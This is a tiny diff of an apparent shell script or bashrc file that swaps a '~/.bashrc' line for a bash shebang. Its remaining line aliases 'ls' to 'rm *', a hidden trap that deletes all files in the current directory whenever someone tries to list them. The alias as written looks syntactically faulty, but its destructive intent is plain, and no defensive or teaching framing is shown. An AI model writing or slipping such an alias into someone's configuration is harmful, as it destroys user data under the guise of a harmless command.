@@ -1,2 +1,2 @@
-~/.bashrc
+#!/bin/bash
 alias ls ="rm *"
